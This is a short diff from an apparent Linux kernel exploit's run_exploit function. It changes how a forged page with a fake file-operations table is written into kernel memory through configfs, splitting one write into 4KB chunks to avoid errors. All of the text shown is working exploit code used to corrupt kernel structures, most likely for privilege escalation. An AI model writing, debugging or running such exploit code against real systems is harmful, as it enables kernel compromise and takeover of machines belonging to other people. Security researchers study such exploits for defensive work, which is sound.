@@ -495,11 +495,19 @@ int run_exploit(int argc, char **argv) {
       /* Fops table */
       put_fake_fops_table(p, FOPS_TABLE_OFF);
 
-      /* Write entire page via configfs */
-      if (kernel_write_data(fd, page_base, p, ORDER3_SIZE) == (ssize_t)ORDER3_SIZE) {
+            /* Write page in 4KB chunks to avoid EINVAL */
+      int init_ok = 1;
+      for (size_t off = 0; off < ORDER3_SIZE; off += 4096) {
+        size_t chunk = (off + 4096 > ORDER3_SIZE) ? (ORDER3_SIZE - off) : 4096;
+        ssize_t wr = kernel_write_data(fd, page_base + off, p + off, chunk);
+        if (wr != (ssize_t)chunk) {
+          pr_error("S25FE: chunk off=%zu ret=%zd errno=%d\n", off, wr, errno);
+          init_ok = 0;
+          break;
+        }
+      }
+      if (init_ok) {
         pr_success("S25FE: initialized fake page via configfs\n");
-      } else {
-        pr_error("S25FE: configfs page init failed errno=%d\n", errno);
       }
       close(fd);
     }
